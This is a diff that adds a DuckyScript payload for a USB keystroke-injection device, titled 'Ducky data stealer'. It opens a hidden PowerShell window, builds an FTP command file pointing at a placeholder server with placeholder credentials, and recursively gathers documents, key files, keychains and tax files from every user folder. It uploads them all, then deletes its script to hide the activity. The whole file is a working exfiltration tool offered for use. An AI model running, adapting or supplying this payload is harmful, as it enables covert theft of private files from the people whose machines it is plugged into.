@@ -1,0 +1,76 @@
+REM Contributors : Abdelli Haithem, Ben Asker Med Amine
+REM Name: Ducky data stealer
+REM Mission: Transfer all documents to an ftp server 
+REM Organisation: Sifaris
+REM OS supported : Windows 7, Windows 8 (8.1)
+
+REM *** Initial Delay 20s ***
+DELAY 10000
+DELAY 10000
+
+REM *** Start a hidden Powershell ***
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden
+ENTER
+DELAY 1000
+
+REM *** Connect to the ftp server ***
+STRING "open ftp.yourdomain.domain" | Set-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "user ftp_username" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "ftp_password" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+
+REM *** Initialize directory name ***
+STRING $h = hostname
+ENTER
+DELAY 500
+STRING $t = Get-Date -format "yyyy_MM_dd__HH\h-mm\m-ss\s"
+ENTER
+DELAY 500
+STRING "mkdir $h" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "cd $h" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "mkdir $t" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "cd $t" | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "bin " | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+STRING "hash " | add-Content script.txt -Encoding ASCII
+ENTER
+DELAY 500
+
+REM *** Collect files / Any extensions supported ***
+STRING get-childitem C:\USERS\ -Force -Include "*.pdf","*.csv","*.dat","*.gbr","*.ged","*.key","*.keychain","*.pps","*.ppt","*.pptx","*.sdf","*.tar","*.tax2012","*.rtf","*.tax2014","*.vcf","*.xml","*.doc","*.docx","*.log","*.msg","*.odt","*.pages","*.rtf","*.tex","*.txt","*.wpd","*.wps" -rec | where {!$_.PSIsContainer} | select-object @{Name="ss";Expression={"put "+$_.FullName}} | Out-File script.txt -encoding ASCII -append
+ENTER
+
+REM *** Execute script.txt ***
+STRING ftp -i -n -s:script.txt
+ENTER
+
+REM *** Exit FTP ***
+STRING quit
+ENTER
+
+REM *** Delete script.txt ***
+STRING del script.txt
+ENTER
+
+REM *** Quit Powershell ***
+STRING exit
+ENTER
+
+
+
